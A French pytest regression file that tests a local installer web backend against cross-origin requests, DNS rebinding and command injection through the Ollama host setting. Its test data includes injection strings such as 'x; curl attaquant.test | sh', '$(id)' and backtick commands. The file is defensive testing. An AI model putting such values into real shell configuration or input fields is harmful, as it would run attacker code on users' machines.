"""L'installeur graphique (127.0.0.1:9877) ne se laisse pas piloter par une page web.

Regression : pendant `install.sh --app`, une page ouverte dans le navigateur pouvait
lancer l'installation et repondre aux confirmations (aucun controle d'Host, d'Origin
ni de Content-Type : un POST text/plain passe sans requete de controle CORS), et
`options.ollama_host` etait ecrit tel quel dans ~/.bashrc (`export OLLAMA_HOST=...`).
"""
import threading
import urllib.error
import urllib.request
from http.server import ThreadingHTTPServer
from pathlib import Path

import pytest

from installer.app.backend import server as backend
from installer.core import events
from installer.core.osdetect import parse_os_release
from installer.core.state import InstallState, valider_hote_ollama

FEDORA = parse_os_release('ID=fedora\nPRETTY_NAME="Fedora 43"\n')


@pytest.fixture
def base_url():
    srv = ThreadingHTTPServer(("127.0.0.1", 0), backend.InstallerHandler)
    srv.daemon_threads = True
    t = threading.Thread(target=srv.serve_forever, daemon=True)
    t.start()
    yield f"http://127.0.0.1:{srv.server_address[1]}"
    srv.shutdown()
    t.join(timeout=5)


def _req(url, method="GET", body=None, headers=None):
    req = urllib.request.Request(url, data=body, method=method, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=5) as r:
            return r.status
    except urllib.error.HTTPError as e:
        return e.code


def test_post_depuis_une_autre_origine_refuse(base_url):
    code = _req(f"{base_url}/api/answer", "POST", b'{"ask_id": "x", "value": true}',
                {"Content-Type": "application/json", "Origin": "https://exemple.test"})
    assert code == 403


def test_post_text_plain_refuse(base_url):
    """Une page peut envoyer du text/plain sans controle CORS : refuse avant toute lecture."""
    code = _req(f"{base_url}/api/install", "POST", b'{"mcps": []}', {"Content-Type": "text/plain"})
    assert code == 415


def test_hote_non_local_refuse(base_url):
    """Rebinding DNS : un nom de domaine qui pointe sur 127.0.0.1 porte son propre Host."""
    assert _req(f"{base_url}/api/sysinfo", headers={"Host": "attaquant.test:9877"}) == 403
    assert _req(f"{base_url}/api/events", headers={"Host": "attaquant.test"}) == 403


def test_l_interface_elle_meme_passe(base_url):
    port = base_url.rsplit(":", 1)[1]
    # meme origine (le front servi par ce serveur) : Origin present ou absent
    assert _req(f"{base_url}/api/answer", "POST", b'{"ask_id": "inconnu", "value": 1}',
                {"Content-Type": "application/json", "Origin": f"http://127.0.0.1:{port}"}) == 404
    assert _req(f"{base_url}/api/answer", "POST", b'{"ask_id": "inconnu", "value": 1}',
                {"Content-Type": "application/json; charset=utf-8"}) == 404
    assert _req(f"{base_url}/api/sysinfo", headers={"Host": f"localhost:{port}"}) == 200


def test_identifiants_de_question_imprevisibles():
    recus = []
    broker = events.AskBroker(recus.append, timeout=0.01)
    for prompt in ("a ?", "b ?"):
        with pytest.raises(TimeoutError):   # personne ne repond ici
            broker.ask("confirm", prompt, default=True)
    ids = [e.ask_id for e in recus if hasattr(e, "ask_id")]
    assert len(ids) == 2 and ids[0] != "ask-1" and ids[1] != "ask-2"
    assert all(len(i) > 20 for i in ids)


@pytest.mark.parametrize("hote", ["", "192.0.2.10", "gpu-box.interne", "ollama", "[2001:db8::1]", "GPU-01.lan"])
def test_hote_ollama_valide(hote):
    assert valider_hote_ollama(hote) == hote


@pytest.mark.parametrize("hote", [
    "x; curl attaquant.test | sh", "$(id)", "a\nexport X=1", "hote:11434", "http://hote",
    "hote avec espace", "`id`", "-oops", "a" * 300, "[::1];id",
])
def test_hote_ollama_refuse(hote):
    with pytest.raises(ValueError):
        valider_hote_ollama(hote)


def test_etat_refuse_un_hote_dangereux():
    with pytest.raises(ValueError):
        InstallState(distro=FEDORA, lyra_dir=Path("/tmp/x"), ollama_host="x;id")


def test_charge_utile_de_l_application_refuse_un_hote_dangereux():
    with pytest.raises(backend.ValidationError, match="ollama_host"):
        backend.validate_install_payload({"options": {"ollama_host": "x; curl a.test|sh"}}, ())


def test_ligne_de_commande_refuse_un_hote_dangereux(capsys):
    from installer import headless
    with pytest.raises(SystemExit):
        headless.parse_args(["--ollama-host", "x;id"])
    assert "hote Ollama invalide" in capsys.readouterr().err
